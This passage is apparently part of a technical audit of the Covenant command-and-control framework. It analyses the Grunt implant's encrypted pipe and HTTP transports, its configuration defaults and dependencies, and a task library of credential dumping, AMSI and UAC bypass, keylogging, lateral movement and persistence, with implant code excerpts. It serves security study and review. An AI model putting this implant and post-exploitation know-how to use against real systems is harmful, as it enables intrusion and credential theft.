`Connect` always returns `true` (`:584`) — the bool is not a connection result. The `TaskExecute` `Connect` branch at `:331-333` therefore *always* reports `"Connection to ... succeeded!"` regardless of whether the pipe ever connects, because `SMBMessenger`'s constructor does not connect (it calls `InitializePipe` which is a no-op until `IsConnected` is false-and-server). `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:331-333, :584]`

`Disconnect` (`:587-597`) matches `DM.Identifier.ToLower() == Identifier.ToLower()` — a `NullReferenceException` if any downstream still has an empty `Identifier` (the lazily-set field at `:558` starts as `string.Empty`, not `null`, so `.ToLower()` is safe). Returns `false` if not found.

### 5.5 `MessageCrafter` — envelope construction

```csharp
public GruntEncryptedMessage Create(byte[] Message, string Meta = "")
{
    byte[] encryptedMessagePacket = Utilities.AesEncrypt(Message, this.SessionKey.Key);
    byte[] encryptionIV = new byte[Common.AesIVLength];
    Buffer.BlockCopy(encryptedMessagePacket, 0, encryptionIV, 0, Common.AesIVLength);
    byte[] encryptedMessage = new byte[encryptedMessagePacket.Length - Common.AesIVLength];
    Buffer.BlockCopy(encryptedMessagePacket, Common.AesIVLength, encryptedMessage, 0, encryptedMessagePacket.Length - Common.AesIVLength);

    byte[] hmac = Utilities.ComputeHMAC(encryptedMessage, SessionKey.Key);
    return new GruntEncryptedMessage { GUID = this.GUID, Meta = Meta, EncryptedMessage = ..., IV = ..., HMAC = ... };
}
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:939-956]`

Identical structure to the server's `GruntEncryptedMessage.Create` — HMAC over ciphertext only, same key for AES and HMAC. Note `Create` does **not** set `Type`, so it defaults to `GruntEncryptedMessageType.Routing` (enum member 0, `:1069`). Tasking envelopes are instead wrapped by the server, which sets `Type` explicitly.

```csharp
public string Retrieve(GruntEncryptedMessage message)
{
    if (message == null || !message.VerifyHMAC(this.SessionKey.Key)) { return null; }
    return Common.GruntEncoding.GetString(Utilities.AesDecrypt(message, SessionKey.Key));
}
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:958-965]` — verify-then-decrypt, correct order, `null` on failure.

### 5.6 `SMBMessenger` — the named pipe transport

Constructors at `:631-650`. Two roles, selected by which constructor:

```csharp
public SMBMessenger(string Hostname, string Pipename)   // :631 -> IsServer = false  (pipe CLIENT)
public SMBMessenger(PipeStream Pipe, string Pipename)    // :639 -> IsServer = true   (pipe SERVER)
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:631-650]`

`InitializePipe()` (`:722-751`) is where the asymmetry T2 described lives:

```csharp
if (this.IsServer)
{
    PipeSecurity ps = new PipeSecurity();
    ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
    NamedPipeServerStream newServerPipe = new NamedPipeServerStream(this.PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
    newServerPipe.WaitForConnection();
    ...
}
else
{
    NamedPipeClientStream ClientPipe = new NamedPipeClientStream(Hostname, PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
    ClientPipe.Connect(Timeout);
    ClientPipe.ReadMode = PipeTransmissionMode.Byte;
    ...
}
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:727-749]`

**The pipe ACL is `WorldSid` with `FullControl` (`:729-730`).** `WellKnownSidType.WorldSid` is `S-1-1-0` — *Everyone*. Any local user, and any sandboxed process with a token, can open `\\.\pipe\gruntsvc` and read/write the encrypted tasking stream. Confidentiality rests entirely on the AES/HMAC layer (see §1.2/§1.3 — IV unauthenticated, non-constant-time MAC), and availability is unprotected: a local process can connect to the pipe first and hold it. This is a materially weaker ACL than the usual `Authenticated Users`/`Administrators` restriction, and it is not configurable — no `PipeSecurity` parameter exists. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:729-731]`

`ClientPipe.Connect(Timeout)` with `Timeout = 5000` (`:613`, `:743`) — a **5-second hardcoded connect timeout**, not operator-tunable.

`Read()`/`Write()` (`:652-702`) implement the reconnect discipline documented in the source comments: the **server-role** peer calls `InitializePipe()` inside `Read()` (`:661-664`) so it blocks on `WaitForConnection` until a client returns; the **client-role** peer calls it inside `Write()` (`:687-690`). The comments at `:657-660` and `:683-686` explain the deadlock this avoids — both peers returning to the same state. Catch clauses are `IOException`, `NullReferenceException`, `ObjectDisposedException` (`:673-675`, `:699-701`), all silent.

`MonitorPipeState()` (`:753-776`) is a **1-second-poll background thread** (`Thread.Sleep(1000)` at `:762`) that mirrors `_Pipe.IsConnected` into `IsConnected`. The comment at `:763` — *"We cannot use this.Pipe.IsConnected because this will result in a deadlock"* — is accurate for the server role, where reading `IsConnected` on a `NamedPipeServerStream` whose peer vanished takes the pipe lock. The thread is `IsBackground = true` (`:774`) so it does not prevent process exit.

`WriteBytes`/`ReadBytes` (`:778-819`) implement a **4-byte big-endian length prefix + Deflate-compressed payload** framing:

```csharp
byte[] compressed = Utilities.Compress(bytes);
byte[] size = new byte[4];
size[0] = (byte)(compressed.Length >> 24);
...
this.Pipe.Write(size, 0, size.Length);
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:780-793]`

and the read side reconstructs with `(size[0] << 24) + (size[1] << 16) + (size[2] << 8) + size[3]` (`:804`).

**`ReadBytes` is a partial-read hazard.** The length header uses a proper `do { ... } while (totalReadBytes < size.Length)` loop (`:800-803`), but the payload loop at `:811-816`:

```csharp
do
{
    readBytes = this.Pipe.Read(buffer, 0, buffer.Length);
    ms.Write(buffer, 0, readBytes);
    totalReadBytes += readBytes;
} while (totalReadBytes < len);
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:811-816]` — on a pipe `Read` returning `0` (peer closed without sending the full payload), this **spins forever**: `totalReadBytes` never increases and the loop condition stays true. There is no zero-read break and no timeout. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:811-816]` The length value `len` is also taken from the wire with no sanity bound, so a malformed 4-byte header (`0x7FFFFFFF`) drives `ms` to grow until OOM.

Note the size header is written but the payload loop uses `buffer.Length` = 1024 (`:806`) — the `Math.Min(..., 1024)` chunking on the write side (`:790`) matches it.

### 5.7 `HttpMessenger` — the HTTP transport

Constructor `:843-872`. `Hostname` is derived by **string splitting the URI**:

```csharp
this.Hostname = CovenantURI.Split(':')[1].Split('/')[2];
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:846]` — `"https://10.0.0.5:443"` → `Split(':')` = `["https", "//10.0.0.5", "443"]` → `[1]` = `"//10.0.0.5"` → `Split('/')` = `["", "", "10.0.0.5"]` → `[2]` = `"10.0.0.5"`. This breaks for a bare `http://host` (no port): `Split(':')` = `["http", "//host"]` → `[1]` = `"//host"` → `Split('/')` = `["", "", "host"]` → `[2]` = `"host"` — works. For a URI with credentials or a non-standard port arrangement it mis-derived. It only feeds `Hostname`, which the HTTP transport never uses, so the defect is latent. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:846]`

`ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;` (`:858`) — SSL 3.0 enabled, identical to the stager. The `ServerCertificateValidationCallback` (`:859-871`) returns `true` when both `UseCertPinning` and `ValidateCert` are false.

`Read()` (`:874-885`) drains `ToReadQueue` first, then `DownloadString(CovenantURI + GetURL())` under `_WebClientLock`. `Write()` (`:887-898`) does `UploadString` and enqueues the **response** into `ToReadQueue` if non-empty — so an HTTP POST's response body is surfaced on the *next* `Read()`. That is the mechanism by which the register response reaches `SetAuthenticator` at `GruntHTTP.cs:78`.

`GetURL()` (`:902-905`) picks a **random** entry from `ProfileHttpUrls` and substitutes `{GUID}` with `Identifier` — so the URL path is randomized per request, matching the server's per-URL MVC route registration.

`SetupCookieWebClient()` (`:907-920`) applies profile headers; the `Cookie` header is special-cased into the cookie jar with `";"`→`","` normalization (`:913`), everything else via `Headers.Set`.

### 5.8 `CookieWebClient`, `Profile`, `Utilities`

`CookieWebClient` (`:968-986`) overrides `GetWebRequest` to attach a persistent `CookieContainer` — needed because `WebClient` otherwise discards cookies, and the ASP.NET listener tracks the session by `ASP.NET_SessionId`.

`Profile.Parse`/`Format` (`:414-438`) — the transport-agnostic template layer:

```csharp
private static GruntEncryptedMessage Parse(string Format, string Message)
{
    string json = Common.GruntEncoding.GetString(Utilities.MessageTransform.Invert(
        Utilities.Parse(Message, Format)[0]
    ));
    if (json == null || json.Length < 3) { return null; }
    return GruntEncryptedMessage.FromJson(json);
}

private static string Format(string Format, GruntEncryptedMessage Message)
{
    return String.Format(Format,
        Utilities.MessageTransform.Transform(Common.GruntEncoding.GetBytes(GruntEncryptedMessage.ToJson(Message)))
    );
}
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:421-438]`

`Utilities.Parse(...)[0]` with no length check before the indexer — a template whose format does not match the response throws `ArgumentOutOfRangeException`, caught in the loop. `MessageTransform` is the **compile-time-injected** transform class (`// {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}` at `:1307` is the substitution site); it is not declared in this file, so the token at `:1307` is replaced with the full `MessageTransform` class body from the profile. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:423-425, :1307]`

`Utilities.AesEncrypt/AesDecrypt/ComputeHMAC/VerifyHMAC/Compress/Decompress/Parse/JavaScriptStringEncode` (`:1135-1305`) — analyzed in §1 and §2.1. `Compress`/`Decompress` are **DeflateStream** (`:1196`, `:1213`), matching the server's `Common.Compress`; the executor payload arrives Deflate-compressed and is expanded at `GruntHTTP.cs:251`.

### 5.9 Deflate, HMAC and AES in `Utilities`

| Method | Line | Body summary |
|---|---|---|
| `AesEncrypt(byte[], byte[])` | 1135-1148 | `Aes.Create()`, CBC/PKCS7, `GenerateIV()`, returns `IV ‖ ciphertext` |
| `AesDecrypt(byte[], byte[])` | 1150-1163 | IV = first 16 bytes, decrypt rest |
| `ComputeHMAC(byte[], byte[])` | 1165-1168 | `new HMACSHA256(key).ComputeHash(input)` |
| `ComputeHash(byte[])` | 1170-1173 | `SHA256.Create().ComputeHash(input)` |
| `VerifyHMAC(byte[], byte[], byte[])` | 1183-1189 | base64-string equality (see §1.3) |
| `AesDecrypt(GruntEncryptedMessage, byte[])` | 1175-1181 | convenience overload, base64-decodes `IV` and `EncryptedMessage` |
| `Compress(byte[])` | 1191-1200 | `DeflateStream` → `MemoryStream` |
| `Decompress(byte[])` | 1202-1219 | `DeflateStream` read loop |
| `Parse(string, string)` | 1227-1245 | regex named-group extraction (see §2.1) |
| `JavaScriptStringEncode(string)` | 1248-1305 | JS/JSON string escaping (see §2.2) |

`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1135-1305]`

`AesDecrypt` is also present on the **executor's own** `GruntEncryptedMessage.AesDecrypt` wrapper at `:1072-1078`, which strips the base64 first. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1072-1078]`

---

## 6. The `Delay` default — two different values, and which one reaches the jitter expression

There are **two** Delay defaults and the distinction determines whether the jitter bug bites:

| Layer | File:line | `Delay` | `JitterPercent` |
|---|---|---|---|
| **`Launcher` model** (what gets compiled into the implant) | `Covenant/Models/Launchers/Launcher.cs:56-57` | **5** | **10** |
| **`Grunt` model** (post-registration DB record) | `Covenant/Models/Grunts/Grunt.cs:71-73` | **10** | **10** |

```csharp
// Covenant/Models/Launchers/Launcher.cs:54-59
public string SMBPipeName { get; set; } = "gruntsvc";
...
public int Delay { get; set; } = 5;
public int JitterPercent { get; set; } = 10;
public int ConnectAttempts { get; set; } = 5000;
public DateTime KillDate { get; set; } = DateTime.Now.AddDays(30);
```
`[source: Covenant/Models/Launchers/Launcher.cs:54-59]`

```csharp
// Covenant/Models/Grunts/Grunt.cs:69-77
public string Note { get; set; } = "";
[Required, Range(0, int.MaxValue)]
public int Delay { get; set; } = 10;
[Required, Range(0, 100)]
public int JitterPercent { get; set; } = 10;
[Required, Range(0, int.MaxValue)]
public int ConnectAttempts { get; set; } = 5000;
[Required]
public DateTime KillDate { get; set; } = DateTime.MaxValue;
```
`[source: Covenant/Models/Grunts/Grunt.cs:71-77]`

**The jitter expression at `GruntHTTP.cs:94` reads the Launcher value (5), because that is what `{{REPLACE_DELAY}}` is substituted with at compile time.** So the bug arithmetic in §3 is exact:

```
Launcher.Delay = 5, Launcher.JitterPercent = 10
5 * (10 / 100.00) = 0.5
Math.Round(0.5)   = 0     (banker's rounding: midpoint → even)
(int)0            = 0
rnd.Next(0)       = 0     ALWAYS
```

The `Grunt.Delay = 10` value is what the **operator sees in the UI after registration** and what `SetDelay` tasking mutates in the *database*. Two consequences:

1. **The UI's displayed delay and the grunt's actual sleep disagree on a fresh launch** (10 vs 5). The register body at `GruntHTTP.cs:65` sends `"delay": <launcher Delay>` = `5`, but `InternalListener.RegisterGrunt` (`InternalListener.cs:783-791`) **does not copy `delay` or `jitter` from the grunt-supplied JSON** — it copies only `IpAddress`, `Hostname`, `OperatingSystem`, `UserDomainName`, `UserName`, `Integrity`, `Process`. So the DB record keeps `Grunt.Delay = 10` while the implant sleeps 5 s. `[source: Covenant/Models/Listeners/InternalListener.cs:783-791]` The `"delay"` and `"jitter"` fields the implant sends in `RegisterBody` are parsed into a `Grunt` object at `:782` and then **discarded** — dead fields on the wire.
2. **There is no server-side path that pushes the launcher's Delay/Jitter to the implant at activation.** The values are frozen at compilation. `SetDelay`/`SetJitter` are the only runtime control, and they are operator-driven.

`Launcher.KillDate = DateTime.Now.AddDays(30)` (`Launcher.cs:59`) is a **relative** default evaluated per-launcher-instance, versus `Grunt.KillDate = DateTime.MaxValue` (`Grunt.cs:77`). The implant's kill-date check at `GruntHTTP.cs:227` compares `KillDate.CompareTo(DateTime.Now) < 0` — so a default launcher self-terminates after 30 days. `ValidateCert`/`UseCertPinning` default to `true` on the *launcher* (`Launcher.cs` mirrors `Grunt.cs:58-60` = `true`/`true`) but the implant's `bool.Parse(@"{{REPLACE_VALIDATE_CERT}}")` receives whatever the operator chose; `HttpListener`'s own default is `true`. The stager's unconditional-accept path at `GruntHTTPStager.cs:62-74` therefore only fires when the operator explicitly disabled both.

---

## 7. Libraries — every dependency with version and use

### 7.1 NuGet `PackageReference`s — `Covenant/Covenant.csproj` (25 packages)

| Package | Version | Role in this codebase |
|---|---|---|
| `BlazorInputFile` | 0.1.0-preview-00002 | Blazor file-upload component for launcher/stager/embedded-resource upload |
| `McMaster.Extensions.CommandLineUtils` | 3.0.0 | CLI arg parsing for `Covenant.cs` host entry |
| `Microsoft.AspNetCore.Blazor` | 3.1.0-preview2.19528.8 | Blazor runtime (preview pin) |
| `Microsoft.AspNetCore.Components` | 3.1.3 | Blazor component model |
| `Microsoft.AspNetCore.Components.Web` | 3.1.3 | Blazor web components |
| `Microsoft.AspNetCore.Mvc.NewtonsoftJson` | 3.1.3 | Newtonsoft serializer injected into MVC — the reason server-side JSON emits Newtonsoft's enum form |
| `Microsoft.AspNetCore.SignalR.Protocols.NewtonsoftJson` | 3.1.3 | SignalR wire protocol via Newtonsoft |
| `NLog.Web.AspNetCore` | 4.9.2 | Logging (`nlog.config`) |
| `Swashbuckle.AspNetCore.Swagger` | 5.3.3 | Swagger metadata |
| `Swashbuckle.AspNetCore.SwaggerGen` | 5.3.3 | Swagger doc generation from the controllers |
| `Swashbuckle.AspNetCore.SwaggerUI` | 5.3.3 | Swagger UI endpoint |
| `Newtonsoft.Json` | **12.0.3** | The serializer used by `InternalListener` (`JsonConvert.SerializeObject/DeserializeObject`) and the whole API layer |
| `Microsoft.Rest.ClientRuntime` | 2.3.21 | `HttpOperationException`, `ServiceClientCredentials` — the AutoRest client substrate; `InternalListener` catches `HttpOperationException` |
| `Microsoft.EntityFrameworkCore.Sqlite` | 3.1.4 | SQLite provider for `covenant.db` |
| `YamlDotNet` | **8.1.1** | Deserializes the 11 task YAML files + 4 profile YAMLs in `DbInitializer` |
| `Microsoft.EntityFrameworkCore` | 3.1.4 | ORM core |
| `Microsoft.AspNetCore.SignalR.Client` | 3.1.3 | `InternalListener`'s `HubConnection` back to the server |
| `Microsoft.DotNet.PlatformAbstractions` | 3.1.4 | Runtime RID detection for the compiler |
| `Microsoft.CodeAnalysis.CSharp` | **3.5.0** | **Roslyn — compiles stagers, executors and tasks in-process** |
| `System.IdentityModel.Tokens.Jwt` | 6.5.0 | JWT bearer tokens for API auth |
| `Microsoft.AspNetCore.Identity.EntityFrameworkCore` | 3.1.3 | `CovenantUser` / Identity roles |
| `Microsoft.AspNetCore.Authentication.JwtBearer` | 3.1.3 | JWT auth middleware |
| `Microsoft.EntityFrameworkCore.InMemory` | 3.1.4 | In-memory provider (tests/dev) |
| `System.Security.Principal.Windows` | 4.7.0 | `WindowsIdentity` on the server side for token operations |

`[source: Covenant/Covenant.csproj]`

`TargetFramework` = **`netcoreapp3.1`**, `LangVersion` = `8.0`. Critically:

```xml
<Compile Remove="Data\Grunt\**" />
<Compile Remove="Data\Tasks\**" />
<Compile Remove="Data\ReferenceSourceLibraries\**" />
<Compile Remove="Data\Downloads\**" />
```
`[source: Covenant/Covenant.csproj]` — **the implants, tasks and reference libraries are excluded from the build.** They are data, compiled at runtime by Roslyn. This is why `GruntHTTP.cs` can contain `{{REPLACE_*}}` tokens as raw C# without breaking the server build.

### 7.2 Vendored assemblies — the 9 DLLs in `Covenant/refs/`

| DLL | Size | Used for |
|---|---|---|
| `Confuser.Core.dll` | 174.5 KB | ConfuserEx core — Obfuscation settings on `Launcher` |
| `Confuser.DynCipher.dll` | 46.0 KB | Dynamic cipher generation for ConfuserEx constants |
| `Confuser.MSBuild.Tasks.dll` | 12.0 KB | ConfuserEx MSBuild integration |
| `Confuser.Protections.dll` | 132.0 KB | ConfuserEx protections (anti-debug, anti-dump, ctrl-flow) |
| `Confuser.Renamer.dll` | 306.0 KB | ConfuserEx symbol renaming |
| `Confuser.Runtime.dll` | 44.0 KB | ConfuserEx injected runtime |
| `dnlib.dll` | **1117.5 KB** | dnlib — IL read/write; the substrate under ConfuserEx and used for stager/executor patching |
| `Donut.dll` | 49.5 KB | **Donut shellcode generator** — `ShellCodeLauncher` converts a .NET assembly to position-independent shellcode |
| `PeNet.dll` | 149.0 KB | PE parsing — `Compiler` uses it for the `.NET` version / architecture checks on assembled output, and `Launcher` for `OutputKind` |

`[source: Covenant/Covenant.csproj]` (the nine `<Reference Include="..."><HintPath>refs\...</HintPath>` entries), sizes from the tree listing.

`Compile Remove="Data\Grunt\**"` does not cover `refs/`, so these are compile-time references resolved by the SDK.

### 7.3 Reference assemblies shipped for the compiler — `Covenant/Data/AssemblyReferences/`

Two target-framework sets, consumed by `Common.DefaultReferencesNet35` / `DefaultReferencesNet40` / `DefaultReferencesNetCore`:

**`net35/` (19 DLLs):** `mscorlib` (1973.8 KB), `System.Configuration.Install` (80 KB), `System.Core` (289.8 KB), `System.Data.DataSetExtensions` (52 KB), `System.Data` (3076.5 KB), `System.DirectoryServices.AccountManagement` (284 KB), `System.DirectoryServices` (392 KB), `System.DirectoryServices.Protocols` (184 KB), `System` (781.8 KB), `System.Drawing` (616 KB), `System.IdentityModel` (396 KB), `System.Management.Automation` (**2940 KB** — PowerShell), `System.Management` (380 KB), `System.Security` (268 KB), `System.ServiceProcess` (116 KB), `System.Web.Extensions` (1252 KB), `System.Windows.Forms` (4908 KB), `System.XML` (2008 KB).

**`net40/`:** the same set at .NET 4.0 versions, e.g. `mscorlib` 2588.3 KB, `System.Management.Automation` 1575.3 KB, `System.Data` 3458.5 KB.

`[source: Covenant/Data/AssemblyReferences/net35/, Covenant/Data/AssemblyReferences/net40/]`

Because these are real .NET 3.5/4.0 BCL assemblies, tasks compiled against them can `using System.Management.Automation` (PowerShell), `System.DirectoryServices` (LDAP/AD), `System.Windows.Forms` (screenshot), `System.Drawing`, `System.ServiceProcess` — the DLL set *is* the capability set. Roslyn is pointed at these files via `MetadataReference.CreateFromFile` and the `GetUsedTypes*` pruning walk (T2 §4.6).

The `netcoreapp3.0` set for the Brute implant is not shipped in `AssemblyReferences/`; it resolves from the installed .NET Core SDK share, which is why `RuntimeIdentifier` matters for that implant only. `[inference]`

### 7.4 Implant-side project files

**`Data/Grunt/Brute/Brute/Brute.csproj`** — `netcoreapp3.1`, `OutputType=library`, `RuntimeIdentifier=win-x64`, **no PackageReferences**. The Brute implant is pure BCL. `[source: Covenant/Data/Grunt/Brute/Brute/Brute.csproj]`

**`Data/Grunt/Brute/BruteStager/BruteStager.csproj`** — `netcoreapp3.1`, `OutputType=Exe`, **`PublishTrimmed=true`**, **`PublishSingleFile=true`**, `RuntimeIdentifier=win-x64`, with explicit `TrimmerRootAssembly` entries to stop the trimmer eating reflection-adjacent types:

```xml
<TrimmerRootAssembly Include="System.IO.Pipes" />
<TrimmerRootAssembly Include="System.Threading" />
<TrimmerRootAssembly Include="System.Threading.Thread" />
<TrimmerRootAssembly Include="System.Diagnostics.Process" />
<TrimmerRootAssembly Include="System.ComponentModel.EventBasedAsync" />
<TrimmerRootAssembly Include="System.Runtime.InteropServices" />
```
`[source: Covenant/Data/Grunt/Brute/BruteStager/BruteStager.csproj]`

The trimmer roots map 1:1 onto what the Brute stager needs: pipes (transport), threads (TaskExecute), process (recon), EBA (async), interop (P/Invoke). `PublishSingleFile` + `PublishTrimmed` is why `BruteStager` is a self-contained ~single binary — but it also means **any reflection the trimmer cannot see is silently removed**, which is a real hazard for `Assembly.Load` + `GetMethod("Execute")` (the trimmer emits IL warnings but the build succeeds). `[inference]`

`Brute/Task/Task.sln` exists with no `.csproj` in the tree — the task-solution shell is present but the project file is absent from this checkout.

---

## 8. Task library — all 11 YAML files, 95 tasks

Counts verified by parsing each file's top-level `- Name:` keys.

| YAML file | Tasks | .NET target | Notes |
|---|---|---|---|
| `DefaultGruntTasks.yaml` | **23** | Net35, Net40 (control tasks also NetCore31) | Control + filesystem + recon + file transfer |
| `DotNetCore.yaml` | **13** | NetCore31 | The cross-platform (Brute) task set |
| `GhostPack.yaml` | **6** | Net35, Net40 | Rubeus, SharpDPAPI, SharpUp, SharpDump, Seatbelt, SharpWMI |
| `SharpSC.yaml` | **1** | Net35, Net40 | Service control |
| `SharpSploit.Credentials.yaml` | **15** | Net35, Net40 | 3 TokenTasks |
| `SharpSploit.Enumeration.yaml` | **16** | Net35, Net40 | |
| `SharpSploit.Evasion.yaml` | **1** | Net35, Net40 | BypassAmsi |
| `SharpSploit.Execution.yaml` | **9** | Net35, Net40 | |
| `SharpSploit.LateralMovement.yaml` | **6** | Net35, Net40 | |
| `SharpSploit.Persistence.yaml` | **4** | Net35, Net40 | |
| `SharpSploit.PrivilegeEscalation.yaml` | **1** | Net35, Net40 | PrivExchange |
| **Total** | **95** | | |

### 8.1 Full task name lists (verbatim)

**`DefaultGruntTasks.yaml` — 23:** `Help`, `PowerShellImport`, `Connect`, `Exit`, `Tasks`, `TaskKill`, `Delay`, `Jitter`, `ConnectAttempts`, `KillDate`, `Disconnect`, `ScreenShot`, `Download`, `Upload`, `WhoAmI`, `GetCurrentDirectory`, `ChangeDirectory`, `ReadTextFile`, `CreateDirectory`, `Delete`, `Copy`, `Kill`, `SharpShell` `[source: Covenant/Data/Tasks/DefaultGruntTasks.yaml]`

**`DotNetCore.yaml` — 13:** `ListDirectory`, `Assembly`, `ShellCmd`, `Shell`, `WhoAmI`, `ChangeDirectory`, `ReadTextFile`, `CreateDirectory`, `Delete`, `Copy`, `ProcessList`, `Download`, `Upload` `[source: Covenant/Data/Tasks/DotNetCore.yaml]`

**`GhostPack.yaml` — 6:** `Rubeus`, `SharpDPAPI`, `SharpUp`, `SharpDump`, `Seatbelt`, `SharpWMI` `[source: Covenant/Data/Tasks/GhostPack.yaml]`

**`SharpSC.yaml` — 1:** `SharpSC` `[source: Covenant/Data/Tasks/SharpSC.yaml]`

**`SharpSploit.Credentials.yaml` — 15:** `MakeToken`, `GetSystem`, `ImpersonateProcess`, `ImpersonateUser`, `BypassUACGrunt`, `BypassUACCommand`, `RevertToSelf`, `LogonPasswords`, `LsaSecrets`, `LsaCache`, `SamDump`, `Wdigest`, `DCSync`, `Mimikatz`, `SafetyKatz` `[source: Covenant/Data/Tasks/SharpSploit.Credentials.yaml]`

**`SharpSploit.Enumeration.yaml` — 16:** `GetNetSession`, `GetNetLoggedOnUser`, `GetNetLocalGroupMember`, `GetNetLocalGroup`, `GetDomainGroup`, `GetDomainUser`, `GetDomainComputer`, `Keylogger`, `Kerberoast`, `PortScan`, `ListDirectory`, `ProcessList`, `SetRegistryKey`, `GetRegistryKey`, `SetRemoteRegistryKey`, `GetRemoteRegistryKey` `[source: Covenant/Data/Tasks/SharpSploit.Enumeration.yaml]`

**`SharpSploit.Evasion.yaml` — 1:** `BypassAmsi` `[source: Covenant/Data/Tasks/SharpSploit.Evasion.yaml]`

**`SharpSploit.Execution.yaml` — 9:** `Shell`, `ShellCmd`, `ShellRunAs`, `ShellCmdRunAs`, `CreateProcessWithToken`, `PowerShell`, `Assembly`, `AssemblyReflect`, `ShellCode` `[source: Covenant/Data/Tasks/SharpSploit.Execution.yaml]`

**`SharpSploit.LateralMovement.yaml` — 6:** `WMIGrunt`, `WMICommand`, `PowerShellRemotingGrunt`, `PowerShellRemotingCommand`, `DCOMGrunt`, `DCOMCommand` `[source: Covenant/Data/Tasks/SharpSploit.LateralMovement.yaml]`

**`SharpSploit.Persistence.yaml` — 4:** `PersistStartup`, `PersistCOMHijack`, `PersistWMI`, `PersistAutorun` `[source: Covenant/Data/Tasks/SharpSploit.Persistence.yaml]`

**`SharpSploit.PrivilegeEscalation.yaml` — 1:** `PrivExchange` `[source: Covenant/Data/Tasks/SharpSploit.PrivilegeEscalation.yaml]`

### 8.2 The control tasks and which OS/.NET surface they drive

These are the tasks that map directly onto the implant's own switch cascade in `GruntHTTP.cs:104-211` — they never need a compiled assembly.

| Task | `TaskingType` | Grunt handler | .NET / OS surface |
|---|---|---|---|
| `Exit` | (control) | `GruntHTTP.cs:143-149` | returns from `Execute`, ends beacon |
| `Tasks` | (control) | `GruntHTTP.cs:150-160` | enumerates `List<KeyValuePair<string,Thread>>` `IsAlive` |
| `TaskKill` | (control) | `GruntHTTP.cs:161-180` | **`Thread.Abort()` + `Thread.Suspend()`** (both unsupported on .NET Core) |
| `Delay` | (control) | `GruntHTTP.cs:104-112` | mutates the loop-local `Delay` int |
| `Jitter` | (control) | `GruntHTTP.cs:113-117` | mutates `Jitter`; feeds the `rnd.Next` bound (§3) |
| `ConnectAttempts` | (control) | `GruntHTTP.cs:118-129` | mutates `ConnectAttempts` |
| `KillDate` | (control) | `GruntHTTP.cs:130-142` | mutates `KillDate`; checked at `:227` |
| `Disconnect` | (control) | `GruntHTTP.cs:334` | `TaskingMessenger.Disconnect(Identifier)` → closes `SMBMessenger` |
| `Connect` | (control) | `GruntHTTP.cs:331-333` | `TaskingMessenger.Connect(Hostname, PipeName)` → `SMBMessenger` + reader thread |
| `Help` | (control) | — | lists the task set from `ApiModels.GruntTask` |
| `PowerShellImport` | (control) | — | reads the `PowerShellImport` field set at `Grunt.cs:106` |

### 8.3 Out-of-switch tasks and the API surface they drive

| Task | Implementation | Driven API |
|---|---|---|
| `WhoAmI` | `DefaultGruntTasks.yaml` inline C# | `Environment.UserName`/`Environment.UserDomainName` |
| `GetCurrentDirectory` | inline | `Directory.GetCurrentDirectory()` |
| `ChangeDirectory` | inline | `Directory.SetCurrentDirectory()` |
| `ReadTextFile` | inline | `File.ReadAllText` |
| `CreateDirectory` | inline | `Directory.CreateDirectory` |
| `Delete` | inline | `File.Delete` / `Directory.Delete` |
| `Copy` | inline | `File.Copy` / `Directory` |
| `Download` | inline | `File.ReadAllBytes` → base64 up |
| `Upload` | inline | base64 down → `File.WriteAllBytes` |
| `Kill` | inline | `Process.GetProcessById(pid).Kill()` |
| `SharpShell` | inline | `System.Reflection.Assembly.Load` + invoke, in-grunt |
| `ScreenShot` | inline | `System.Windows.Forms` / GDI+ desktop capture |
| `BypassAmsi` | SharpSploit.Evasion | `amsi.dll!AmsiScanBuffer` patch via `VirtualProtect` |
| `PortScan` | SharpSploit.Enumeration | `TcpClient.Connect`/`Socket` sweep |
| `Keylogger` | SharpSploit.Enumeration | `GetAsyncKeyState` P/Invoke loop |
| `Kerberoast` | SharpSploit.Enumeration | `System.DirectoryServices` LDAP SPN query + `KerberosRequestorSecurityToken` |
| `GetDomainUser` etc. | SharpSploit.Enumeration | `System.DirectoryServices` |
| `SetRegistryKey`/`GetRegistryKey` | SharpSploit.Enumeration | `Microsoft.Win32.Registry` / `RemoteRegistry` |
| `LogonPasswords`, `LsaSecrets`, `LsaCache`, `SamDump`, `Wdigest`, `DCSync`, `Mimikatz`, `SafetyKatz` | SharpSploit.Credentials | LSASS memory read, `System.Security.Cryptography` DPAPI, SAM registry hive |
| `MakeToken`, `ImpersonateProcess`, `ImpersonateUser`, `GetSystem`, `RevertToSelf` | SharpSploit.Credentials (**`TokenTask=true`**) | `LogonUser`, `DuplicateTokenEx`, `ImpersonateLoggedOnUser`, `SetThreadToken` — **these take the `message.Token` branch at `GruntHTTP.cs:181-205`** |
| `BypassUACGrunt`, `BypassUACCommand` | SharpSploit.Credentials | `ICMLuaUtil`/`IFileOperation` COM elevation |
| `Shell`, `ShellCmd`, `PowerShell`, `Assembly`, `AssemblyReflect`, `ShellCode` | SharpSploit.Execution | `Process.Start`, PowerShell host, `Assembly.Load`, `VirtualAlloc`+`CreateThread` |
| `ShellRunAs`, `ShellCmdRunAs`, `CreateProcessWithToken` | SharpSploit.Execution | `CreateProcessWithLogonW` / `CreateProcessWithTokenW` |
